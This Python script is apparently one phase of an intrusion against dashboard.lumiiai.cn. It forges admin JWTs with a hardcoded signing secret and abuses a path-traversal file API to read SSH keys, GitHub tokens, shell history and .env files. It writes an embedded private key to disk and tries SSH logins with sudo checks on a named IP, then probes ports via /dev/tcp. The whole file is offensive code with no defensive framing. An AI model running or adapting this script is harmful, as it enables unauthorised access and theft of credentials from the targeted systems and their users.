#!/usr/bin/env python3
# i29311 phase5: harvest Brian high-value files + SSH test with coder@lumii3 key
import os, sys, json, base64, hmac, hashlib, subprocess, random
import urllib.parse as up
HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
KEY = '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACAnkiLeesCyhQNoFOo2MOJeij5Qfzz1M9PdcicHRWosQQAAAJC7YY3/u2GN\n/wAAAAtzc2gtZWQyNTUxOQAAACAnkiLeesCyhQNoFOo2MOJeij5Qfzz1M9PdcicHRWosQQ\nAAAECwuvObbalp9pc2yaZt5cHhuj6UejwWiwT2SkYQfU04FyeSIt56wLKFA2gU6jYw4l6K\nPlB/PPUz091yJwdFaixBAAAADGNvZGVyQGx1bWlpMwE=\n-----END OPENSSH PRIVATE KEY-----\n'
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)
def sh(a, timeout=90):
    try:
        r = subprocess.run(a, capture_output=True, timeout=timeout); return r.returncode, r.stdout.decode("utf-8","replace"), r.stderr.decode("utf-8","replace")
    except Exception as e: return -1, "", repr(e)
def curl(args, timeout=40): return sh(["curl","-s","-k","-m",str(timeout)]+args, timeout=timeout+15)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(p):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":"))); pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(JWT_SECRET.encode(),(h+"."+pl).encode(),hashlib.sha256).digest())
def tok_for(uid,cust): return forge({"userId":uid,"email":"probe@x","customer":cust,"role":"admin"})
def call(path,cookie,timeout=30,maxlen=200000):
    a=["--http2","-A",UA,"-H","Accept: application/json","-H","Cookie: session="+cookie,"-w","\n__CODE__%{http_code}","https://%s%s"%(HOST,path)]
    rc,out,err=curl(a,timeout=timeout); i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:maxlen]}
K="/home/lumii/.lumii-agent-keeper/.."
def rd(aid,rel,tok,maxlen=20000): return call("/api/agents/%s/files?action=read&path=%s"%(aid,up.quote(K+rel,safe="/")),tok,maxlen=maxlen)
def ls(aid,rel,tok,maxlen=20000): return call("/api/agents/%s/files?action=list&path=%s"%(aid,up.quote(K+rel,safe="/")),tok,maxlen=maxlen)
AID="agent-047f1d22"; CUST="aro"; AUID="fc7c3730-4219-11f1-ac43-525400595be1"
def main():
    TOK = tok_for(AUID, CUST)
    # high value reads
    for f in ["/.config/gh/hosts.yml","/.lumii/agents/agent-047f1d22/lumii-agent-keeper/config.toml","/.lumii-agent-keeper/crons/jobs.json","/.docker/.token_seed","/.gnupg/sshcontrol",".ssh/authorized_keys.bak-20261016-newdev","/.ssh/authorized_keys",".bash_history",".ssh/id_ed25519.pub"]:
        R("RD"+f.replace("/","_")[:50], rd(AID,f,TOK,maxlen=20000))
    # list candidate repo dirs
    for d in ["/lumii-ai-backend","/lumii-assistant","/lumii-goldenyears-agent","/lumii-sandbox","/Documents","/Work","/projects","/code","/repos",".claude/memory",".claude/projects",".gstack/sessions"]:
        R("LS"+d.replace("/","_")[:50], ls(AID,d,TOK,maxlen=6000))
    # read common env files in repos
    for f in ["/lumii-ai-backend/.env","/lumii-ai-backend/.env.local","/lumii-ai-backend/.env.production","/lumii-ai-backend/.env.prod","/lumii-assistant/.env","/lumii-assistant/.env.local"]:
        R("RD"+f.replace("/","_")[:50], rd(AID,f,TOK,maxlen=6000))
    # SSH test
    open("/tmp/bkey","w").write(KEY); os.chmod("/tmp/bkey",0o600)
    R("sshkeylen", str(len(KEY)))
    for host in ["101.32.60.77"]:
        rc,out,err=sh(["bash","-lc","timeout 25 ssh -i /tmp/bkey -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o PreferredAuthentications=publickey coder@%s 'id; hostname; sudo -n id 2>&1 | head -2; uname -a' 2>&1"%host],timeout=40)
        R("SSH_"+host, "rc=%d out=%s err=%s"%(rc,out[:1500],err[:800]))
    # nc reachability
    for host,port in [("101.32.60.77","22"),("101.32.60.77","443")]:
        rc,out,err=sh(["bash","-lc","timeout 8 bash -c '</dev/tcp/%s/%s' && echo OPEN || echo CLOSED"%(host,port)],timeout=15)
        R("NC_%s_%s"%(host,port), out.strip()+err.strip())
try: main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-3000:])
finally: sys.exit(0)
